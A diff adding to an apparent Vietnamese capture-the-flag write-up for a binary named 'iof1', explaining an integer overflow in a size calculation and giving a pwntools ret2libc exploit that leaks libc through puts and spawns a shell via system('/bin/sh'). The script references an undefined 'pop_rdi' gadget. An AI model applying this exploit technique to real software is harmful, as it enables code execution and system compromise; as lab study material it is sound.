@@ -106,4 +106,64 @@ nghĩa là nếu ta nhập n sao cho n * 8 nó tràn ra phạm vi của unsigned
 
 # Thực thi
 * Ở đây mỗi giá trị khác nhau cho ta những payload khác nhau về offset (giá trị nhỏ nhất là 0x2000000000000000), ở đây em chọn 0x2000000000000001
-* 
+* Chạy thử debug thì ta đã đúng, khi ta đã cấp phát bộ nhớ nhỏ và số lượng kí tự nhập vào lớn  
+![image](https://user-images.githubusercontent.com/111769169/222918324-d23d04d7-6676-4b7d-8b7b-77182c08da22.png)  
+* việc sau đó là ret2libc
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./iof1_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-2.31.so")
+
+context.binary = exe
+def conn():
+    if args.LOCAL:
+        r = process([exe.path])
+        gdb.attach(r, gdbscript='''
+                    b*main+267
+                    c
+                    ''')
+    else:
+        r = remote("addr", 1337)
+
+    return r
+
+
+def main():
+    r = conn()
+    input()
+    
+    #################
+    ### leak libc ###
+    #################
+    r.sendlineafter(b"> ", b'2305843009213693953')
+    payload = b'a' * 40 + p64(pop_rdi) + p64(exe.got['puts'])
+    payload += p64(exe.plt['puts']) + p64(exe.sym['main'])
+    r.sendlineafter(b'secret: ', payload)
+
+    ######################
+    ### tinh base libc ###
+    ######################
+    leak = u64(r.recvline(keepends=False) + b'\0\0')
+    log.info("leak libc: " + hex(leak))
+    libc.address = leak - 0x783a0
+    log.info("base libc: " + hex(libc.address))
+    r.sendlineafter(b"> ", b'2305843009213693953')
+
+    #################
+    ### tao shell ###
+    #################
+    payload = b'a' * 40
+    payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
+    payload += p64(libc.sym['system'])
+    r.sendlineafter(b'secret: ', payload)
+
+    r.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
